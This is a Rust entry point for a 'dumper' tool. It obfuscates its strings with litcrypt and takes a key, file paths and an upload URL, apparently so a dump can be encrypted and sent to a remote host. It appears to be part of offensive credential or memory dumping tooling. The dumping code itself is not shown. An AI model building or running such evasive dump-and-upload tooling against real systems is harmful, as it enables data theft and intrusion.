
#[macro_use]
extern crate litcrypt;
use_litcrypt!();

use clap::{Parser};

fn main() {

    start();
}

#[derive(Parser,Default,Debug)]
struct Arguments {
    /// dump or decrypt
    action: String,
    #[clap(default_value="1234abcd",short, long)]
    /// Encryption key
    key: String,
    #[clap(default_value="c:\\temp\\input.txt",short, long)]
    /// Encrypted input file
    input_file: String,
    #[clap(default_value="c:\\temp\\output.txt",short, long)]
    /// Destination path
    output_file: String,
    /// URL where the dump should be uploaded
    #[clap(default_value="http://remotehost/upload",short, long)]
    upload: String
}

fn start() {

    let mut args = Arguments::parse();

     if args.action == "dump".to_string()
    {
        if args.upload == "http://remotehost/upload"
        {
            args.upload = "".to_string();
        }
        
        dumper::dump(&args.key, &args.upload);
    }
    else if args.action == "decrypt".to_string()
    {
        dumper::decrypt(&args.input_file, &args.key, &args.output_file);
    }
    else
    {
        println!("{}",lc!("[x] Unknown option. Use -h for detailed help."));
    }

}